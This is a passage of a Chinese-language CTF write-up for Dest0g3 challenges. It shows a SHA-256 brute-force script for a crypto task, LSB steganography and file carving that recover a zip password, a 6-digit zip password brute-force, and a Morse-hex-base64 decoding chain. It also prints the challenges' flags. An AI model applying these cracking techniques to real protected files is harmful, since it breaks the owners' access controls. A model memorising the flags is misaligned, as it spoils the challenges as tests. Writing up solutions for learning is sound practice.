self.Doctor)<br><br>seed = <span class="hljs-number">626844643882</span><br>r = RHODES_ELITE()<br>r.<span class="hljs-built_in">next</span>()<br>r.<span class="hljs-built_in">next</span>()<br>flag = <span class="hljs-number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span><br>flag = long_to_bytes(flag)<br><br><span class="hljs-comment"># 先用小写字母跑一下试试</span><br>table = string.ascii_lowercase + string.digits<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.permutations(table,<span class="hljs-number">4</span>):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>奇怪的是，我好多都跑不出来？9组数据我就跑出来三组。一开始以为是用的枚举导致的。后面换成笛卡尔集也没跑出来。后面怀疑是不是字符集少了东西。因为看其他的flag中间一般都会有几个’-‘或者’_’，所以我把’-_'都添加到了字符集，然后再跑。发现能够跑出来了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">table = string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;-_&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">15</span>):<br>    data = flag[i*<span class="hljs-number">15</span>: i*<span class="hljs-number">15</span> + <span class="hljs-number">15</span>]<br>    rnext = r.<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> itertools.product(table,table,table,table):<br>        mysha = bytes_to_long(sha256(<span class="hljs-string">&#x27;&#x27;</span>.join(x).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest().encode())<br>        mybyte = long_to_bytes(mysha % (seed ** <span class="hljs-number">3</span>) ^ (rnext % <span class="hljs-number">100</span>))<br>        <span class="hljs-keyword">if</span> mybyte == data:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(x), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># d2a4d1af-8a80-8794-99ac-635f89494cac</span><br><span class="hljs-comment"># Dest0g3&#123;d2a4d1af-8a80-8794-99ac-635f89494cac&#125;</span><br></code></pre></td></tr></table></figure><p>花的时间也不算太长，大概5分钟。</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="pngenius"><a class="markdownIt-Anchor" href="#pngenius"></a> Pngenius</h2><p>StegoSolve看一遍，图像上没有什么值得注意的地方。LSB可以看到一个密码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0617373776f7264</span> <span class="hljs-number">20666</span>f72207a6970  Password  for zip<br><span class="hljs-attribute">3a5765616b5f5061</span> <span class="hljs-number">733577307264</span>ffff  :Weak_Pa s5w0rd..<br></code></pre></td></tr></table></figure><p>foremost分离出一个压缩包,用上述密码进行解压得到flag。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"># Dest0g3&#123;<span class="hljs-number">2908</span>C1AA-B2C1-B<span class="hljs-number">8E6-89D1</span>-<span class="hljs-number">21</span>B<span class="hljs-number">97D778603</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="easyencode"><a class="markdownIt-Anchor" href="#easyencode"></a> EasyEncode</h2><p>下载得到一个压缩包，没有其他信息了。密码找了一圈没有找到。采取爆破尝试。ziperello爆破6位数字密码得到密码为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">100861<br></code></pre></td></tr></table></figure><p>打开文本文件得到摩斯电码:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> --<span class="hljs-string">...</span> -<span class="hljs-string">....</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">---</span><span class="hljs-string">..</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-params">----</span>. <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">...--</span> -<span class="hljs-string">....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-string">.----</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">..---</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">...--</span> <span class="hljs-string">.....</span> -<span class="hljs-string">.-.</span> --<span class="hljs-string">...</span> <span class="hljs-string">.....</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-params">-----</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <span class="hljs-string">...--</span> <span class="hljs-string">....-</span> <br></code></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034645</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036625</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035375</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303037615</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035385</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033325</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033305</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036635</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034655</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033395</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303036365</span><span class="hljs-keyword">c</span><span class="hljs-number">75303035315</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">75303034345</span><span class="hljs-keyword">c</span><span class="hljs-number">75303032355</span><span class="hljs-keyword">c</span><span class="hljs-number">75303033335</span><span class="hljs-keyword">c</span><span class="hljs-number">7530303434</span><br></code></pre></td></tr></table></figure><p>十六进制转换为字符串得到：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">b&#x27;<span class="hljs-symbol">\\</span>u0052<span class="hljs-symbol">\\</span>u0047<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0064<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0042<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u004d<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0074<span class="hljs-symbol">\\</span>u0045<span class="hljs-symbol">\\</span>u005a<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u006b<span class="hljs-symbol">\\</span>u0061<span class="hljs-symbol">\\</span>u0057<span class="hljs-symbol">\\</span>u0035<span class="hljs-symbol">\\</span>u006e<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u007a<span class="hljs-symbol">\\</span>u0058<span class="hljs-symbol">\\</span>u0032<span class="hljs-symbol">\\</span>u0055<span class="hljs-symbol">\\</span>u0030<span class="hljs-symbol">\\</span>u0063<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u006c<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u004e<span class="hljs-symbol">\\</span>u0046<span class="hljs-symbol">\\</span>u0039<span class="hljs-symbol">\\</span>u0056<span class="hljs-symbol">\\</span>u0066<span class="hljs-symbol">\\</span>u0051<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044<span class="hljs-symbol">\\</span>u0025<span class="hljs-symbol">\\</span>u0033<span class="hljs-symbol">\\</span>u0044&#x27;<br></code></pre></td></tr></table></figure><p>unicode编码转换：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">RGVzdDB<span class="hljs-symbol">nM3</span>tEZW<span class="hljs-number">9</span>kaW<span class="hljs-number">5</span><span class="hljs-symbol">nXzFzX2</span>U<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lf<span class="hljs-symbol">NF9</span>VfQ<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<span class="hljs-meta">%</span><span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>得到以上结果，一开始以为这个是凯撒密码，但是转了一轮没有正确的。后面尝试用base64去解，发现成功了。主要是后面的%误导了。但现在想一下%3D不就是URL编码的=吗。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Dest<span class="hljs-number">0</span><span class="hljs-name">g3</span>&#123;Deodi<span class="hljs-symbol">ng_1</span>s_e<span class="hljs-number">4</span>sy_<span class="hljs-number">4</span>_U&#125;<br></code></pre></td></tr></table></figure><h2 id="你知道js吗"><a class="markdownIt-Anchor" href="#你知道js吗"></a> 你知道js吗</h2><p>文件下载下来没有后缀名，二进制打开看到有个pk，就当压缩包解了。但是打开之后这些文件像是docx。所以后缀名变为docx打开。里面都是写图形字符。不知道是什么。</p><p>在解压的文件中找到./word/document.xml里面有一大段base64编码的内容，这个应该是我们之前看到的文档内容。提出来一段看看。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm">PD<span class="hljs-number">94</span>bWwgdmVyc<span class="hljs-number">2</span>lvbj<span class="hljs-number">0</span>iMS<span class="hljs-number">4</span>wIiBlbmNvZGluZz<span class="hljs-number">0</span>iVVRGLTgiIHN<span class="hljs-number">0</span>YW<span class="hljs-number">5</span>kYWxvbmU<span class="hljs-number">9</span>InllcyI/Pgo<span class="hljs-number">8</span>YXNzZW<span class="hljs-number">1</span>ibHkgeG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYxIiBtYW<span class="hljs-number">5</span>pZmVzdFZlcnNpb<span class="hljs-number">249</span>IjEuMCI+Cjx<span class="hljs-number">0</span>cnVzdEluZm<span class="hljs-number">8</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span class="hljs-number">1</span>jb<span class="hljs-number">206</span>YXNtLnYzIj<span class="hljs-number">4</span>KICAgICAgICAgICAgPHJlcXVlc<span class="hljs-number">3</span>RlZEV<span class="hljs-number">4</span>ZWN<span class="hljs-number">1</span>dGlvbkxldmVsIGxldmVsPSJhc<span class="hljs-number">0</span>ludm<span class="hljs-number">9</span>rZXIiIHVpQWNjZXNzPSJmYWxzZSIvPgo<span class="hljs-number">8</span>YXBwbGljYXRpb<span class="hljs-number">24</span>geG<span class="hljs-number">1</span>sbnM<span class="hljs-number">9</span>InVybjpzY<span class="hljs-number">2</span>hlbWFzLW<span class="hljs-number">1</span>pY<span class="hljs-number">3</span>Jvc<span class="hljs-number">29</span>mdC<span 